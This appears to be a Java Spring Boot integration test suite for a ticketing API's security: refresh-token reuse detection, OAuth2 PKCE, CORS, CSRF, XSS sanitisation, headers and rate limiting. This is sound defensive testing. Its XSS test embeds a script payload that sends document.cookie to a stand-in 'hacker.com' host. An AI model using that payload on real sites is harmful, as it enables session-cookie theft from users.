package com.flashticket.api.controller;

import static org.hamcrest.Matchers.containsString;
import static org.hamcrest.Matchers.hasItem;
import static org.hamcrest.Matchers.not;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.options;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.header;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

import com.flashticket.infrastructure.security.OAuth2FlowService;
import com.jayway.jsonpath.JsonPath;
import jakarta.servlet.http.Cookie;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.webmvc.test.autoconfigure.AutoConfigureMockMvc;
import org.springframework.http.MediaType;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.MvcResult;

@SpringBootTest
@AutoConfigureMockMvc
class SecurityAndRateLimitIntegrationTest {

    @Autowired
    private MockMvc mockMvc;

    @Test
    @DisplayName("Fase 5.1 & 5.2: Deve autenticar via JWT Stateless, rotacionar Refresh Token e revogar toda a família ao detectar reuso (roubo)")
    void shouldAuthenticateWithJwtAndRevokeEntireFamilyOnRefreshTokenReuse() throws Exception {
        // 1. Tentativa de acessar rota protegida sem token -> 401 Unauthorized
        mockMvc.perform(get("/api/v2/auth/me"))
                .andExpect(status().isUnauthorized());

        // 2. Login com credenciais válidas -> recebe Access Token (JWT) e Refresh Token #1
        String loginBody = """
                {
                  "email": "caike@flashticket.com",
                  "password": "Flash@2026"
                }
                """;

        MvcResult loginResult = mockMvc.perform(post("/api/v2/auth/login")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(loginBody))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.accessToken").isNotEmpty())
                .andExpect(jsonPath("$.refreshToken").isNotEmpty())
                .andExpect(jsonPath("$.tokenFamilyId").isNotEmpty())
                .andReturn();

        String json = loginResult.getResponse().getContentAsString();
        String accessToken1 = JsonPath.read(json, "$.accessToken");
        String refreshToken1 = JsonPath.read(json, "$.refreshToken");
        String familyId = JsonPath.read(json, "$.tokenFamilyId");

        // 3. Acessa /api/v2/auth/me com o Access Token válido -> 200 OK
        mockMvc.perform(get("/api/v2/auth/me")
                        .header("Authorization", "Bearer " + accessToken1))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.authenticated").value(true))
                .andExpect(jsonPath("$.subject").value("caike@flashticket.com"))
                .andExpect(jsonPath("$.roles", hasItem("ROLE_ORGANIZER")));

        // 4. Adultera 1 caractere da assinatura do JWT -> 401 Unauthorized
        String tamperedJwt = accessToken1.substring(0, accessToken1.length() - 2) + "XX";
        mockMvc.perform(get("/api/v2/auth/me")
                        .header("Authorization", "Bearer " + tamperedJwt))
                .andExpect(status().isUnauthorized());

        // 5. Rotaciona o Refresh Token #1 legítimo -> emite Refresh Token #2 na mesma família
        MvcResult rotateResult = mockMvc.perform(post("/api/v2/auth/refresh")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"refreshToken\":\"" + refreshToken1 + "\"}"))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.tokenFamilyId").value(familyId))
                .andReturn();

        String refreshToken2 = JsonPath.read(rotateResult.getResponse().getContentAsString(), "$.refreshToken");

        // 6. SIMULAÇÃO DE ROUBO (REUSE DETECTION):
        // Um invasor tenta reutilizar o Refresh Token #1 (que já foi usado no passo 5!)
        mockMvc.perform(post("/api/v2/auth/refresh")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"refreshToken\":\"" + refreshToken1 + "\"}"))
                .andExpect(status().isUnauthorized())
                .andExpect(jsonPath("$.detail", containsString("Reuso de Refresh Token detectado")));

        // 7. Comprova que TODA a família foi revogada em cadeia: até o Refresh Token #2 foi bloqueado!
        mockMvc.perform(post("/api/v2/auth/refresh")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"refreshToken\":\"" + refreshToken2 + "\"}"))
                .andExpect(status().isUnauthorized())
                .andExpect(jsonPath("$.detail", containsString("revogado")));

        // 8. Comprova que o alerta foi gravado na Trilha de Auditoria NoSQL
        mockMvc.perform(get("/api/v2/audit-logs")
                        .param("actionType", "SECURITY_REFRESH_TOKEN_REUSE_DETECTED"))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$[0].actionType").value("SECURITY_REFRESH_TOKEN_REUSE_DETECTED"));
    }

    @Test
    @DisplayName("Fase 5.3: Deve executar OAuth 2.0 Authorization Code Flow com PKCE (S256) e Client Credentials Flow (M2M)")
    void shouldExecuteOAuth2PkceAndClientCredentialsFlows() throws Exception {
        // --- FLUXO A: Authorization Code Flow com PKCE (S256) ---
        String codeVerifier = "segredo_pkce_gerado_pelo_frontend_spa_1234567890";
        String codeChallenge = OAuth2FlowService.computeS256CodeChallenge(codeVerifier);

        String authorizeBody = String.format("""
                {
                  "clientId": "flashticket-web-spa",
                  "userEmail": "caike@flashticket.com",
                  "redirectUri": "https://app.flashticket.com/callback",
                  "codeChallenge": "%s",
                  "codeChallengeMethod": "S256",
                  "state": "xyz987"
                }
                """, codeChallenge);

        MvcResult authorizeResult = mockMvc.perform(post("/api/v2/auth/oauth2/authorize")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(authorizeBody))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.authorizationCode").isNotEmpty())
                .andReturn();

        String authCode = JsonPath.read(authorizeResult.getResponse().getContentAsString(), "$.authorizationCode");

        // Tentativa de trocar o code com um code_verifier ERRADO (ataque de interceptação) -> 401
        String badTokenRequest = String.format("""
                {
                  "grantType": "authorization_code",
                  "clientId": "flashticket-web-spa",
                  "code": "%s",
                  "codeVerifier": "verifier_errado_do_atacante"
                }
                """, authCode);

        mockMvc.perform(post("/api/v2/auth/oauth2/token")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(badTokenRequest))
                .andExpect(status().isUnauthorized())
                .andExpect(jsonPath("$.detail", containsString("PKCE")));

        // Troca o code com o code_verifier CORRETO -> 200 OK + Access Token
        String validTokenRequest = String.format("""
                {
                  "grantType": "authorization_code",
                  "clientId": "flashticket-web-spa",
                  "code": "%s",
                  "codeVerifier": "%s"
                }
                """, authCode, codeVerifier);

        MvcResult pkceTokenResult = mockMvc.perform(post("/api/v2/auth/oauth2/token")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(validTokenRequest))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.accessToken").isNotEmpty())
                .andReturn();

        String userAccessToken = JsonPath.read(pkceTokenResult.getResponse().getContentAsString(), "$.accessToken");

        // Usuário comum (ROLE_USER) tenta acessar rota exclusiva de parceiro M2M -> 403 Forbidden
        mockMvc.perform(get("/api/v2/security-demo/partner-only")
                        .header("Authorization", "Bearer " + userAccessToken))
                .andExpect(status().isForbidden());

        // --- FLUXO B: Client Credentials Flow (Machine-to-Machine / M2M) ---
        String clientCredentialsRequest = """
                {
                  "grantType": "client_credentials",
                  "clientId": "flashticket-partner-gateway",
                  "clientSecret": "partner-secret-2026",
                  "scope": "tickets:read webhooks:write"
                }
                """;

        MvcResult m2mResult = mockMvc.perform(post("/api/v2/auth/oauth2/token")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(clientCredentialsRequest))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.accessToken").isNotEmpty())
                .andReturn();

        String partnerAccessToken = JsonPath.read(m2mResult.getResponse().getContentAsString(), "$.accessToken");

        // Parceiro com ROLE_PARTNER acessa a rota exclusiva -> 200 OK
        mockMvc.perform(get("/api/v2/security-demo/partner-only")
                        .header("Authorization", "Bearer " + partnerAccessToken))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.partnerClientId").value("flashticket-partner-gateway"));
    }

    @Test
    @DisplayName("Fase 5.4, 5.5, 5.6 & 5.7: Deve validar CORS, CSRF Double-Submit Cookie, Sanitização XSS, Security Headers e Rate Limiter (429)")
    void shouldEnforceCorsCsrfXssHeadersAndTokenBucketRateLimiter() throws Exception {
        // 1. CORS: Origem autorizada recebe headers CORS e 200 OK no Preflight OPTIONS
        mockMvc.perform(options("/api/v2/events")
                        .header("Origin", "https://app.flashticket.com")
                        .header("Access-Control-Request-Method", "POST"))
                .andExpect(status().isOk())
                .andExpect(header().string("Access-Control-Allow-Origin", "https://app.flashticket.com"));

        // CORS: Origem maliciosa é barrada com 403 Forbidden
        mockMvc.perform(get("/api/v2/events")
                        .header("Origin", "https://evil-phishing-site.com"))
                .andExpect(status().isForbidden());

        // 2. CSRF (Double-Submit Cookie): Sem o header X-XSRF-TOKEN -> 403 Forbidden
        mockMvc.perform(post("/api/v2/security-demo/cookie-checkout")
                        .cookie(new Cookie("XSRF-TOKEN", "token_secreto_123"))
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"orderId\":\"999\"}"))
                .andExpect(status().isForbidden());

        // CSRF: Com Cookie XSRF-TOKEN + Header X-XSRF-TOKEN idênticos -> 200 OK
        mockMvc.perform(post("/api/v2/security-demo/cookie-checkout")
                        .cookie(new Cookie("XSRF-TOKEN", "token_secreto_123"))
                        .header("X-XSRF-TOKEN", "token_secreto_123")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"orderId\":\"999\"}"))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.csrfVerified").value(true));

        // 3. XSS Sanitization & Security Headers (CSP, X-Content-Type-Options, X-Frame-Options)
        String xssPayload = """
                {
                  "rawHtml": "<script>fetch('https://hacker.com?cookie='+document.cookie)</script><img src=x onerror=\\"alert(1)\\">Festival <b>FlashTicket</b>"
                }
                """;

        mockMvc.perform(post("/api/v2/security-demo/sanitize-xss")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(xssPayload))
                .andExpect(status().isOk())
                .andExpect(header().string("Content-Security-Policy", containsString("default-src 'self'")))
                .andExpect(header().string("X-Content-Type-Options", "nosniff"))
                .andExpect(header().string("X-Frame-Options", "DENY"))
                .andExpect(jsonPath("$.sanitizedSafeOutput", not(containsString("<script>"))))
                .andExpect(jsonPath("$.sanitizedSafeOutput", not(containsString("onerror"))))
                .andExpect(jsonPath("$.sanitizedSafeOutput", containsString("Festival")));

        // 4. Rate Limiter (Token Bucket: 5 requisições permitidas -> 6ª retorna 429 Too Many Requests)
        mockMvc.perform(post("/api/v2/security-demo/rate-limited/reset"))
                .andExpect(status().isOk());

        for (int i = 1; i <= 5; i++) {
            mockMvc.perform(get("/api/v2/security-demo/rate-limited")
                            .header("X-Client-Key", "cliente-teste-rate-limit"))
                    .andExpect(status().isOk())
                    .andExpect(header().string("X-Rate-Limit-Remaining", String.valueOf(5 - i)));
        }

        // 6ª requisição dentro do mesmo minuto estoura o balde -> 429 Too Many Requests!
        mockMvc.perform(get("/api/v2/security-demo/rate-limited")
                        .header("X-Client-Key", "cliente-teste-rate-limit"))
                .andExpect(status().isTooManyRequests())
                .andExpect(header().string("X-Rate-Limit-Remaining", "0"))
                .andExpect(header().exists("X-Rate-Limit-Retry-After-Seconds"));
    }
}
